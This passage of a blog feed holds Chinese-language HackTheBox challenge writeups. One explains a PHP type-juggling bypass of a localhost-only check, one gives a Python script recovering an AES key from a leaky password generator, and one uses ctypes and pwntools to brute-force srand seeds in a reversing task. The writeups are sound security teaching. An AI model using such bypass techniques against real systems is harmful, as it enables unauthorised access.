class="function">    </span>&#123;</span><br><span class="line">        <span class="built_in">parent</span>::<span class="title function_ invoke__">__construct</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">index</span>(<span class="params"><span class="variable">$router</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$router</span>-&gt;<span class="title function_ invoke__">view</span>(<span class="string">&#x27;index&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getfacts</span>(<span class="params"><span class="variable">$router</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$jsondata</span> = <span class="title function_ invoke__">json_decode</span>(<span class="title function_ invoke__">file_get_contents</span>(<span class="string">&#x27;php://input&#x27;</span>), <span class="literal">true</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> ( <span class="keyword">empty</span>(<span class="variable">$jsondata</span>) || !<span class="title function_ invoke__">array_key_exists</span>(<span class="string">&#x27;type&#x27;</span>, <span class="variable">$jsondata</span>))</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="variable">$router</span>-&gt;<span class="title function_ invoke__">jsonify</span>([<span class="string">&#x27;message&#x27;</span> =&gt; <span class="string">&#x27;Insufficient parameters!&#x27;</span>]);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$jsondata</span>[<span class="string">&#x27;type&#x27;</span>] === <span class="string">&#x27;secrets&#x27;</span> &amp;&amp; <span class="variable">$_SERVER</span>[<span class="string">&#x27;REMOTE_ADDR&#x27;</span>] !== <span class="string">&#x27;127.0.0.1&#x27;</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="variable">$router</span>-&gt;<span class="title function_ invoke__">jsonify</span>([<span class="string">&#x27;message&#x27;</span> =&gt; <span class="string">&#x27;Currently this type can be only accessed through localhost!&#x27;</span>]);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">switch</span> (<span class="variable">$jsondata</span>[<span class="string">&#x27;type&#x27;</span>])</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">case</span> <span class="string">&#x27;secrets&#x27;</span>:</span><br><span class="line">                <span class="keyword">return</span> <span class="variable">$router</span>-&gt;<span class="title function_ invoke__">jsonify</span>([</span><br><span class="line">                    <span class="string">&#x27;facts&#x27;</span> =&gt; <span class="variable">$this</span>-&gt;facts-&gt;<span class="title function_ invoke__">get_facts</span>(<span class="string">&#x27;secrets&#x27;</span>)</span><br><span class="line">                ]);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">case</span> <span class="string">&#x27;spooky&#x27;</span>:</span><br><span class="line">                <span class="keyword">return</span> <span class="variable">$router</span>-&gt;<span class="title function_ invoke__">jsonify</span>([</span><br><span class="line">                    <span class="string">&#x27;facts&#x27;</span> =&gt; <span class="variable">$this</span>-&gt;facts-&gt;<span class="title function_ invoke__">get_facts</span>(<span class="string">&#x27;spooky&#x27;</span>)</span><br><span class="line">                ]);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">case</span> <span class="string">&#x27;not_spooky&#x27;</span>:</span><br><span class="line">                <span class="keyword">return</span> <span class="variable">$router</span>-&gt;<span class="title function_ invoke__">jsonify</span>([</span><br><span class="line">                    <span class="string">&#x27;facts&#x27;</span> =&gt; <span class="variable">$this</span>-&gt;facts-&gt;<span class="title function_ invoke__">get_facts</span>(<span class="string">&#x27;not_spooky&#x27;</span>)</span><br><span class="line">                ]);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">default</span>:</span><br><span class="line">                <span class="keyword">return</span> <span class="variable">$router</span>-&gt;<span class="title function_ invoke__">jsonify</span>([</span><br><span class="line">                    <span class="string">&#x27;message&#x27;</span> =&gt; <span class="string">&#x27;Invalid type!&#x27;</span></span><br><span class="line">                ]);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><p>上面提到在訪問 &#x2F;api&#x2F;getfacts 的時候會帶一個 type 的參數，根據不同的 case 會有不同的 response，其中有一個 type 是 secrets 他前面先檢查是否是本地存取，否的話就會 return 然後輸出警告。<br>那這邊就要提到 php 的一個問題，就是當我們使用兩個等號做比較的時候會被稱作 loose comparison，因為當兩個類型不同時 php 會嘗試幫我們轉型再做比較。<br>例如，0 &#x3D;&#x3D; ‘0’ 和 0 &#x3D;&#x3D; false 都會返回 true，因為在鬆散比較下 PHP 會將字符串和布爾值轉換成數字進行比較。<br>而當我們使用 &#x3D;&#x3D;&#x3D;：這會是一個 strict comparison，不會進行類型轉換。<br>嚴格比較要求值和類型都必須相同，否則結果為 false。<br>例如，0 &#x3D;&#x3D;&#x3D; ‘0’ 和 0 &#x3D;&#x3D;&#x3D; false 都會返回 false，因為類型不同（數字與字符串或布爾值），PHP 不會嘗試轉換它們。<br>那這邊放上一張圖片給大家參考：<br><img                       lazyload                     src="/images/loading.svg"                     data-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/0*E-5cStZUndETrKec.png"                      alt="ref"                ><br>圖片來源：<a class="link"   href="https://blog.stackademic.com/the-curious-case-of-php-loose-comparisons-a-tale-of-a-b-and-c-70e6dff98c39" >https://blog.stackademic.com/the-curious-case-of-php-loose-comparisons-a-tale-of-a-b-and-c-70e6dff98c39 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a><br>那我們就可以嘗試找到一個值是會在三個等號時不等於 ‘secrets’ 但是兩個等號會相等的，這種漏洞也叫做 Type Juggling Vulnerability 跟題目呼應，中文可能叫型別強制漏洞。<br>那我們就透過 true 來跟 “secrets” 做比較搭配 burp 來協助我們送封包，效果如下：<br><img                       lazyload                     src="/images/loading.svg"                     data-src="/../images/juggling.png"                      alt="weak"                ></p><h4 id="Pwned"><a href="#Pwned" class="headerlink" title="Pwned !!!"></a>Pwned !!!</h4><p><img                       lazyload                     src="/images/loading.svg"                     data-src="/../images/juggling_pwn.png"                      alt="pwn"                ></p><h2 id="References"><a href="#References" class="headerlink" title="References"></a>References</h2><ul><li><a class="link"   href="https://cristi075.github.io/HTB-HackTheBoo-2022-Web4-Juggling-Facts" >https://cristi075.github.io/HTB-HackTheBoo-2022-Web4-Juggling-Facts <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></li></ul>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;Exploitation&quot;&gt;&lt;a href=&quot;#Exploitation&quot; class=&quot;headerlink&quot; title=&quot;Exploitation&quot;&gt;&lt;/a&gt;Exploitation&lt;/h2&gt;&lt;p&gt;這題是 web，我們逛一下網站後會看到沒有明顯的輸入點，但是</summary>
      
    
    
    
    
    <category term="htb" scheme="https://kazma.tw/tags/htb/"/>
    
    <category term="challenges" scheme="https://kazma.tw/tags/challenges/"/>
    
    <category term="writeup&#39;" scheme="https://kazma.tw/tags/writeup/"/>
    
    <category term="web" scheme="https://kazma.tw/tags/web/"/>
    
    <category term="php" scheme="https://kazma.tw/tags/php/"/>
    
  </entry>
  
  <entry>
    <title>HackTheBox-Challenges SPG Writeup</title>
    <link href="https://kazma.tw/2024/11/01/HackTheBox-Challenges-SPG-Writeup/"/>
    <id>https://kazma.tw/2024/11/01/HackTheBox-Challenges-SPG-Writeup/</id>
    <published>2024-11-01T10:03:28.954Z</published>
    <updated>2024-11-01T12:09:01.384Z</updated>
    
    <content type="html"><![CDATA[<h2 id="Exploitation"><a href="#Exploitation" class="headerlink" title="Exploitation"></a>Exploitation</h2><p>首先題目附給我們 <code>source.py</code> 以及 <code>output.txt</code>，其中程式的主邏輯如下：</p><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">from</span> base64 <span class="keyword">import</span> b64encode</span><br><span class="line"><span class="keyword">from</span> hashlib <span class="keyword">import</span> sha256</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.Padding <span class="keyword">import</span> pad</span><br><span class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> FLAG, MASTER_KEY</span><br><span class="line"></span><br><span class="line">ALPHABET = string.ascii_letters + string.digits + <span class="string">&quot;~!@#$%^&amp;*&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">generate_password</span>():</span><br><span class="line">    master_key = <span class="built_in">int</span>.from_bytes(MASTER_KEY, <span class="string">&quot;little&quot;</span>)</span><br><span class="line">    password = <span class="string">&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> master_key:</span><br><span class="line">        bit = master_key &amp; <span class="number">1</span></span><br><span class="line">        <span class="keyword">if</span> bit:</span><br><span class="line">            password += random.choice(ALPHABET[: <span class="built_in">len</span>(ALPHABET) // <span class="number">2</span>])</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            password += random.choice(ALPHABET[<span class="built_in">len</span>(ALPHABET) // <span class="number">2</span> :])</span><br><span class="line">        master_key &gt;&gt;= <span class="number">1</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> password</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    password = generate_password()</span><br><span class="line">    encryption_key = sha256(MASTER_KEY).digest()</span><br><span class="line">    cipher = AES.new(encryption_key, AES.MODE_ECB)</span><br><span class="line">    ciphertext = cipher.encrypt(pad(FLAG, <span class="number">16</span>))</span><br><span class="line"></span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;output.txt&quot;</span>, <span class="string">&quot;w&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        f.write(</span><br><span class="line">            <span class="string">f&quot;Your Password : <span class="subst">&#123;password&#125;</span>\nEncrypted Flag : <span class="subst">&#123;b64encode(ciphertext).decode()&#125;</span>&quot;</span></span><br><span class="line">        )</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure></div><p>我們來分析一下上面做了些什麼，首先他有一個 <code>generate_password()</code> 的函式把引入的 MASTER_KEY 來生成一組密碼。他先把 MASTER_KEY 用 little_endian 的格式轉成整數，接著從最低位開始若 bit 為 1 則從自定義的字母表前半部分挑一個字符加入 password，反之，若 bit 為 0 就從後半部挑一個字符，然後往高位移動一個重複前面的操作。再來 main 使用 MASTER_KEY 通過 SHA-256 雜湊算法生成加密金鑰 encryption_key，<code>sha256(MASTER_KEY).digest()</code> 會產生一個 256 位的摘要，這會用於之後 AES 加密的密鑰。<br>接著我們會使用生成的 encryption_key 初始化 AES 加密器，並選擇 ECB 模式。然後把 flag padding 到 16 位確保 AES 可以正常運作，然後執行加密後輸出 password 跟 flag。</p><p>那分析完後首先我們會想先想辦法得到 master_key，那根據他字母表的建立方式我們可以知道前半跟後半分別是：<code>abcdefghijklmnopqrstuvwxyzABCDEFGHI</code>，<code>JKLMNOPQRSTUVWXYZ0123456789~!@#$%^&amp;*</code>，所以我們可以透過 password 的每一位在前半或是後半知道 master_key 的每一個 bit 是 0 還是 1 如此就可以得到 master_key，接著就是正常的 AES 操作。</p><h2 id="Exploit"><a href="#Exploit" class="headerlink" title="Exploit"></a>Exploit</h2><p>最後按照剛剛的邏輯把腳本實現如下：</p><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">from</span> base64 <span class="keyword">import</span> b64decode</span><br><span class="line"><span class="keyword">from</span> hashlib <span class="keyword">import</span> sha256</span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> long_to_bytes</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.Padding <span class="keyword">import</span> unpad</span><br><span class="line"></span><br><span class="line">alph = string.ascii_letters + string.digits + <span class="string">&quot;~!@#$%^&amp;*&quot;</span></span><br><span class="line">first_half, second_half = <span class="built_in">set</span>(alph[:<span class="built_in">len</span>(alph) // <span class="number">2</span>]), <span class="built_in">set</span>(alph[<span class="built_in">len</span>(alph) // <span class="number">2</span>:])</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">load_data</span>():</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;output.txt&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        password = f.readline().split(<span class="string">&quot; : &quot;</span>)[<span class="number">1</span>].strip()</span><br><span class="line">        enc_flag = b64decode(f.readline().split(<span class="string">&quot; : &quot;</span>)[<span class="number">1</span>].strip())</span><br><span class="line">    <span class="keyword">return</span> password, enc_flag</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">recover_master_key</span>(<span class="params">password</span>):</span><br><span class="line">    bits = [<span class="string">&#x27;1&#x27;</span> <span class="keyword">if</span> p <span class="keyword">in</span> first_half <span class="keyword">else</span> <span class="string">&#x27;0&#x27;</span> <span class="keyword">for</span> p <span class="keyword">in</span> password]</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">int</span>(<span class="string">&#x27;&#x27;</span>.join(bits[::-<span class="number">1</span>]), <span class="number">2</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">decrypt_flag</span>(<span class="params">master_key, enc_flag</span>):</span><br><span class="line">    encryption_key = sha256(long_to_bytes(master_key)[::-<span class="number">1</span>]).digest()</span><br><span class="line">    cipher = AES.new(encryption_key, AES.MODE_ECB)</span><br><span class="line">    <span class="keyword">return</span> unpad(cipher.decrypt(enc_flag), <span class="number">16</span>).decode()</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">pwn</span>():</span><br><span class="line">    password, enc_flag = load_data()</span><br><span class="line">    master_key = recover_master_key(password)</span><br><span class="line">    flag = decrypt_flag(master_key, enc_flag)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;Decrypted FLAG: <span class="subst">&#123;flag&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line">pwn()</span><br></pre></td></tr></table></figure></div><div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">╰─ python solve.py                                      ─╯</span><br><span class="line">Decrypted FLAG: HTB&#123;m4ll34bl3_p4ssw0rd_g3n3r4t0r!&#125;</span><br></pre></td></tr></table></figure></div><h4 id="Pwned"><a href="#Pwned" class="headerlink" title="Pwned !!!"></a>Pwned !!!</h4><p><img                       lazyload                     src="/images/loading.svg"                     data-src="/../images/spg_pwn.png"                      alt="pwn"                ></p><h2 id="References"><a href="#References" class="headerlink" title="References"></a>References</h2><ul><li><a class="link"   href="https://github.com/hackthebox/htboo-ctf-2023/blob/main/htboo-ctf-2023/crypto/%5BVery%20Easy%5D%20SPG/README.md" >https://github.com/hackthebox/htboo-ctf-2023/blob/main/htboo-ctf-2023/crypto/%5BVery%20Easy%5D%20SPG/README.md <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></li></ul>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;Exploitation&quot;&gt;&lt;a href=&quot;#Exploitation&quot; class=&quot;headerlink&quot; title=&quot;Exploitation&quot;&gt;&lt;/a&gt;Exploitation&lt;/h2&gt;&lt;p&gt;首先題目附給我們 &lt;code&gt;source.py&lt;/code</summary>
      
    
    
    
    
    <category term="htb" scheme="https://kazma.tw/tags/htb/"/>
    
    <category term="challenges" scheme="https://kazma.tw/tags/challenges/"/>
    
    <category term="writeup&#39;" scheme="https://kazma.tw/tags/writeup/"/>
    
    <category term="crypto" scheme="https://kazma.tw/tags/crypto/"/>
    
  </entry>
  
  <entry>
    <title>HackTheBox-Challenges FlagCasino Writeup</title>
    <link href="https://kazma.tw/2024/11/01/HackTheBox-Challenges-FlagCasino-Writeup/"/>
    <id>https://kazma.tw/2024/11/01/HackTheBox-Challenges-FlagCasino-Writeup/</id>
    <published>2024-11-01T09:16:21.217Z</published>
    <updated>2024-11-01T09:35:16.321Z</updated>
    
    <content type="html"><![CDATA[<h2 id="Exploitation"><a href="#Exploitation" class="headerlink" title="Exploitation"></a>Exploitation</h2><p>這是一題逆向，因為程式不長就直接放上來：</p><div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __fastcall <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> input; <span class="comment">// [rsp+Bh] [rbp-5h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> i; <span class="comment">// [rsp+Ch] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;[ ** WELCOME TO ROBO CASINO **]&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(</span><br><span class="line">    <span class="string">&quot;     ,     ,\n&quot;</span></span><br><span class="line">    <span class="string">&quot;    (\\____/)\n&quot;</span></span><br><span class="line">    <span class="string">&quot;     (_oo_)\n&quot;</span></span><br><span class="line">    <span class="string">&quot;       (O)\n&quot;</span></span><br><span class="line">    <span class="string">&quot;     __||__    \\)\n&quot;</span></span><br><span class="line">    <span class="string">&quot;  []/______\\[] /\n&quot;</span></span><br><span class="line">    <span class="string">&quot;  / \\______/ \\/\n&quot;</span></span><br><span class="line">    <span class="string">&quot; /    /__\\\n&quot;</span></span><br><span class="line">    <span class="string">&quot;(\\   /____\\\n&quot;</span></span><br><span class="line">    <span class="string">&quot;---------------------&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;[*** PLEASE PLACE YOUR BETS ***]&quot;</span>);</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">0x1D</span>; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;&gt; &quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> ( (<span class="type">unsigned</span> <span class="type">int</span>)__isoc99_scanf(<span class="string">&quot; %c&quot;</span>, &amp;input) != <span class="number">1</span> )</span><br><span class="line">      <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">    srand(input);</span><br><span class="line">    <span class="keyword">if</span> ( rand() != check[i] )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;[ * INCORRECT * ]&quot;</span>);</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;[ *** ACTIVATING SECURITY SYSTEM - PLEASE VACATE *** ]&quot;</span>);</span><br><span class="line">      <span class="built_in">exit</span>(<span class="number">-2</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[ * CORRECT *]&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;[ ** HOUSE BALANCE $0 - PLEASE COME BACK LATER ** ]&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><p>上面是 ida 反編譯的主程式邏輯，總之我們就是要連續輸入正確的亂數種子來符合 check 陣列裡的值，所以就是一個 flag checker，這裡我們來撰寫 exploit 來算出對應的亂數種子。</p><h2 id="Exploit"><a href="#Exploit" class="headerlink" title="Exploit"></a>Exploit</h2><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> ctypes</span><br><span class="line">libc = ctypes.CDLL(<span class="string">&#x27;libc.so.6&#x27;</span>)</span><br><span class="line">mapping = &#123;&#125;</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">255</span>):</span><br><span class="line">    libc.srand(i)</span><br><span class="line">    mapping[libc.rand()] = <span class="built_in">chr</span>(i)</span><br><span class="line">flag = <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">casino = ELF(<span class="string">&quot;./casino&quot;</span>, checksec=<span class="literal">False</span>)</span><br><span class="line"><span class="keyword">for</span> b <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">30</span>):</span><br><span class="line">    val = casino.u32(casino.sym[<span class="string">&quot;check&quot;</span>] + b * <span class="number">4</span>)</span><br><span class="line">    flag += mapping[val]</span><br><span class="line"><span class="built_in">print</span>(flag)</span><br></pre></td></tr></table></figure></div><p>首先我們載入 <code>ctypes</code> 讓 python 可以呼叫 C 標準函式庫中的函數。<br>然後使用 ctypes.CDLL 函數來加載 Linux 的 C 標準函式庫 libc.so.6，這樣加載後的 libc 物件就可以直接呼叫 C 標準庫中的函數，例如題目中用到的 srand() 和 rand()。<br>然後我們遞迴 ascii 的範圍建一個字典，再來我們可以透過 ida 觀察到 check 陣列觀察到有 30 個 4 bytes，所以這裡我們可以把 casino 用 pwntools 載進來之後透過 u32 以及一次移動我們的指針四個單位來找到對應的隨機種子，最後印出我們的 flag。</p><div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">╰─ file casino                                          ─╯</span><br><span class="line">casino: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=7618b017ef4299337610a90a0a6ccb7f9efc44a4, <span class="keyword">for</span> GNU/Linux 3.2.0, not stripped</span><br></pre></td></tr></table></figure></div><h4 id="Pwned"><a href="#Pwned" class="headerlink" title="Pwned !!!"></a>Pwned !!!</h4><p><img                       lazyload                     src="/images/loading.svg"                     data-src="/../images/casino_pwn.png"                      alt="pwn"                ></p><h2 id="References"><a href="#References" class="headerlink" title="References"></a>References</h2><ul><li><a class="link"   href="https://motasemhamdan.medium.com/hackthebox-flag-casino-reverse-engineering-ctf-writeups-2247bc6dafee" >https://motasemhamdan.medium.com/hackthebox-flag-casino-reverse-engineering-ctf-writeups-2247bc6dafee <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></li></ul>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;Exploitation&quot;&gt;&lt;a href=&quot;#Exploitation&quot; class=&quot;headerlink&quot; title=&quot;Exploitation&quot;&gt;&lt;/a&gt;Exploitation&lt;/h2&gt;&lt;p&gt;這是一題逆向，因為程式不長就直接放上來：&lt;/p&gt;
&lt;div </summary>
      
    
    
    
    
    <category term="htb" scheme="https://kazma.tw/tags/htb/"/>
    
    <category term="challenges" scheme="https://kazma.tw/tags/challenges/"/>
    
    <category term="writeup&#39;" scheme="https://kazma.tw/tags/writeup/"/>
    
    <category term="rev" scheme="https://kazma.tw/tags/rev/"/>
    
  </entry>
  
</feed>
